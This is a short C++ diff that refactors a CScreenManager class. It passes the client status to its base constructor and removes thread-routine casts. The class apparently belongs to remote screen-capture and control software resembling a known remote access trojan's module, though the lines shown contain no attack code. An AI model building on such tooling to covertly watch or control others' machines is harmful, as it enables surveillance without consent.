@@ -8,7 +8,7 @@
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
+CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient, pClient->GetStatus())
 {
     m_bAlgorithm = ALGORITHM_SCAN;
     m_biBitCount = 8;
@@ -20,8 +20,8 @@ CScreenManager::CScreenManager(CClientSocket *pClient):CManager(pClient)
 
     dwmapiDllHandle = LoadLibrary(_T("dwmapi.dll"));
 
-    m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
-    m_hBlankThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ControlThread, this, 0, NULL);
+    m_hWorkThread = MyCreateThread(NULL, 0, WorkThread, this, 0, NULL);
+    m_hBlankThread = MyCreateThread(NULL, 0, ControlThread, this, 0, NULL);
 }
 
 CScreenManager::~CScreenManager()
@@ -63,7 +63,7 @@ void CScreenManager::ResetScreen(int biBitCount)
     m_biBitCount = biBitCount;
 
     m_bIsWorking = true;
-    m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL);
+    m_hWorkThread = MyCreateThread(NULL, 0, WorkThread, this, 0, NULL);
 }
 
 
